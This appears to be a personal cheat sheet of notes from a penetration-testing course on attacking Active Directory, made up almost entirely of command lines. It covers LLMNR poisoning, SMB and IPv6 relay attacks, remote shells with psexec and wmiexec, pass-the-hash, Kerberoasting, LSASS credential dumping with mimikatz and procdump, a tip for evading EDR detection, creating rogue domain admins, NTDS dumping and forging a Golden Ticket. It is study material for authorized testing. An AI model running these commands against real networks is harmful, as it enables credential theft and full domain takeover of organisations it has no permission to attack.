# PJPT-Notes
Cheatsheet from the PJPT course of TCM security.

# Enumeration
```bash
sudo arp-scan -l
```
```bash
netdiscover -r 192.168.5.0/24
```

```bash
nmap -T4 -p- -A 192.168.5.0/24
nmap -T4 -p- -A 192.168.5.1

nmap -T4 -p- -sS -sC 192.168.5.0/24
```

# Initial attacks for Active Directory
## LLMNR Poisoning
1. Start Responder, to capture NTLMv2 hashes
```bash
sudo responder -I tun0 -dP
```
2. If NTLMv2 hash was captured, copy it, save it to a txt file and crack it with hashcat
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## SMB Relay attack
<p>This attacks works, when SMB signing is disabled on the machines.</p>
1. Enumerate, if SMB signing is disabled
```bash
nmap -p445 192.168.5.0/24 --script=smb2-security-mode
```
2. Make changes in the Responder configuration

```bash
sudo nano /etc/responder/Responder.conf

SMB = Off
HTTP = Off
```

3. Start Responder
```bash
sudo responder -I tun0 -dP
```
4. Setup the relay
```bash
# to dump password hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# to create a interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# to run commands to proof
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

# Gaining Shell Access
## Psexec
<p>Create a shell with psexec</p>

```bash
# for domain users
psexec.py test.local/fcastle:'Password1'@192.168.5.1

# for local users
psexec.py fcastle:'Password1'@192.168.5.1

# with local user and password hash
psexec.py Administrator@192.168.5.1 --hashes [LM-hash]:[NTLM-hash]
```

## Wmiexec
<p>Create a shell with wmiexec</p>

```bash
# with local user and password hash
wmiexec.py Administrator@192.168.5.1 --hashes [LM-hash]:[NTLM-hash]
```

## Smbexec
<p>Create a shell with smbexec</p>

```bash
# with local user and password hash
smbexec.py test.local/fcastle:'Password1'@192.168.5.1
```

## Metasploit
<p>Create a shell with metasploit</p>

```bash
use exploit/windows/smb/psexec
set SMBDomain test.local
set SMBUser fcastle
set SMBPass Password1
set RHOSTS 192.168.5.2
```

# IPv6 attacks
<p>If IPv6 is activated in the network, but no DNS server in use, we can imitate one.</p>

1. Open mitm6 for target domain
```bash
sudo mitm6 -d test.local
```

2. Start Ntlmrelayx.py
```bash
Ntlmrelayx.py -6 -t ldaps://192.168.5.1 -wh fakewpad.test.local -l lootme
```

3. You results will save into: '**/home/kali/lootme/domain_computers.html**'

# Post Compromise Enumeration Active Directory
## Domain Enumeration with ldapdomaindump
<p>Domain Enumeration with ldapdomaindump</p>

1. Run ldapdomaindump against domain controller - this will create files with information in about the domain
```bash
sudo ldapdomaindump ldaps://192.168.5.1 -u 'test.local\fcastle\' -p Password1
```

2. list all files and open the html files to investigate the domain information
```bash
# list all files
ls -l

# open up all html domain files
firefox domain_*.html
```

## Domain Enumeration with Bloodhound
<p>Domain Enumeration with Bloodhound</p>

1. Run bloodhound with credentials, to fetch information
```bash
sudo bloodhound-python -d [DOMAIN] -u [USERNAME] -p [USER-PW] -ns [DC-IP]

# example
sudo bloodhound-python -d test.local -u fcastle -p Password1 -ns 192.168.5.1 -c all
```

2. Start up neo4j database and bloodhound to import the files
```bash
# if you started the database the first time, set a new password - REMEMBER THE PASSWORD!
sudo neo4j console

# start bloodhound
sudo bloodhound
```

3. If bloodhound started, just drag and drop the json files into bloodhound and start investigation ;)

## Domain Enumeration with Plumhound
<p>Domain Enumeration with Plumhound</p>

1. Start up neo4j database and bloodhound
```bash
# if you started the database the first time, set a new password - REMEMBER THE PASSWORD!
sudo neo4j console

# start bloodhound
sudo bloodhound
```

2. Start Plumhound against the domain controller - BLOODHOUND MUST ALREADY RUNNING!
```bash
sudo python3 PlumHound.py --easy -p [USER-PW]

sudo python3 PlumHound.py -x tasks/default.tasks -p [USER-PW]
```

3. Finally open up the browser and investigate the results

# Post Compromise Attacks for Active Directory
## Pass the Password / Pass-The-Hash
<p>If we have credentials and have local admin privileges on a machine, we are able to dump the sam database of the computer.</p>
<p>If we have password hashes, but not able to crack them, we are able to use the hash to authenticate.</p>

1. Test your credentials in the network
```bash
# this will test your credentials via SMB on the whole network. If we got a (Pwn3d!) -> we have local admin rights on this machine
crackmapexec smb 192.168.5.0/24 -d test.local -u fcastle -p Password1

# or with a password hash
crackmapexec smb 192.168.5.0/24 -d test.local -u administrator -H [HASH]
```

2. Let's dump some local hashes
```bash
# first way to do it - Secretsdump - With Credentials
secretsdump.py test.local\fcastle:Password1@192.168.5.2

# second way to do it - Secretsdump - With Password-Hash
secretsdump.py administrator@192.168.5.3 --hashes [LM-HASH]:[NT-HASH]

# third way to do it - Metasploit
use windows/smb/psexec
set SMBDomain test.local
set SMBUser fcastle
set SMBPass Password1
set RHOSTS 192.168.5.2
run
hashdump
```

| **Command**  | **Description**                          |
|--------------|------------------------------------------|
| --local-auth | authenticate locally to each target      |
| --sam        | Dump SAM hashes from target system       |
| --lsa        | Dump LSA secrets from target system      |
| --shares     | enumerate shares and access              |
| -M           | Specify the module                       |
| -L           | List available modules for each protocol |

3. Let's use some Modules in crackmapexec
```bash
# Module: lsassy
crackmapexec smb 192.168.5.0/24 -d test.local -u administrator -H [HASH] --local-auth -M lsassy

# access the crackmapexec database
cmedb
```

## Kerberoasting
<p>Kerberoasting aims against accounts with a Service Principal Name (SPNs), for which every domain user is able to request a TGS for this user.</p>
<p>With the request, we get the password hash and crack it offline.</p>

1. Get SPNs with impacket
```bash
# Get SPNs with impacket GetUserSPNs
python GetUserSPNs.py test.local/fcastle:Password1 -dc-ip 192.168.5.1 -request
```

2. Copy the hash/hashes and save to txt file - then run hashcat against it
```bash
# run hashcat to crack the hash
hashcat -m 13100 SPNs-hash.txt /usr/share/wordlists/rockyou.txt
```

## Token Impersonation
<p>If we have a active shell on a system, we can see all tokens on the machine.</p>
<p>With that, we are able to impersonate other users.</p>

1. For this specific scenario, we have a meterpreter shell
```bash
meterpreter > list_tokens -u
```

2. Impersonate a user - example administrator
```bash
meterpreter > impersonate_token test\\administrator
```

## Credential Dumping with different methods
1. Credential Dumping with Mimikatz
```bash
mimikatz(powershell) # privilege::debug
mimikatz(powershell) # lsadump::lsa /patch

mimikatz(powershell) # sekurlsa::minidump lsass.DMP

mimikatz(powershell) # sekurlsa::logonPasswords
```

2. LSASS dump file with Task Manager
```bash
# if you have a graphical user interface
# 1. Open Task Manager
# 2. Go to Details
# 3. Search for lsass.exe process
# 4. Right-click -> Create dump file (lsass.DMP)
# 5. Move the dump file to your kali machine
# 6. Extract passwords and password hashes: pypykatz lsa minidump lsass.DMP
```

3. LSASS dump with procdump
```bash
# on target machine
procdump.exe -accepteula -ma lsass.exe out.dmp
procdump.exe -accepteula -ma “lsass.exe” out.dmp

# some edr search for lsass string - use PID instead of name
Get-Process lsass # PowerShell
tasklist | findstr lsass # CMD

# create a dump file
procdump.exe -accepteula -ma 580 out.dmp
```

4. LSASS dump with Crackmapexec
```bash
crackmapexec smb 192.168.5.0/24 -d test.local -u fcastle -p Password1 --lsa

# remind: we get password hashes and cleartext password, but they will not stored on the cmedb
crackmapexec smb 192.168.5.0/24 -d test.local -u fcastle -p Password1 -M lsassy
```

## CMD / PowerShell magic
<p>If we have the privileges with administrator account to add a compromised account to the local admin group or Domain Admin group.</p>

<p>How to add a new user and add him to domain admin group</p>

```bash
# create a new user local user
net user /add pentester Please-Use-A-Strong-PW!56&

# add the user to local admin group
net localgroup Administrators pentester /add
```

<p>How to add a new user and add him to domain admin group</p>

```bash
# create a new user
net user /add pentester Please-Use-A-Strong-PW!56& /domain

# add the user to domain admin group
net group "Domain Admins" pentester /ADD /DOMAIN
```

## GPP attacks - cPassword
<p>cPasswords are still common in xml files, foundable on NETLOGON/SYSVOL share of the domain controller.</p>
<p>Microsoft accidenatially published the key to decrypt them :)</p>

## Using Metasploit
```bash
use auxiliary/smb_enum_gpp
```

## Decrypt the cPassword
```bash
# tool is default in kali
gpp-decrypt <PASSWORD>
```

# We own the domain - Now What?
## Dumping NTDS.dit database
```bash
secretsdump.py test.local\fcastle:Password1@192.168.5.2 -just-dc-ntlm 
```

## Golden Ticket
<p>We are using Mimikatz for this step.</p>

```bash
privilege::debug

# pull down the user we want
lsadump::lsa /inject /name:krbtgt

# Now create the golden ticket:
# we need following information from the output:
# SID of the domain
# NTLM hash of the krbtgt account
kerberos::golden /User:Administrator /domain:KRUEMEL.keks /sid:S-1-5-21-3311685201-1443070845-3622335404 /krbtgt:3f5f8a614cf590401df166f81b87bf17 /id:500 /ptt

# next we want the golden ticket cmd
misc::cmd

# now check our privileges, with accessing another machine
dir \\Client-01\c$
```
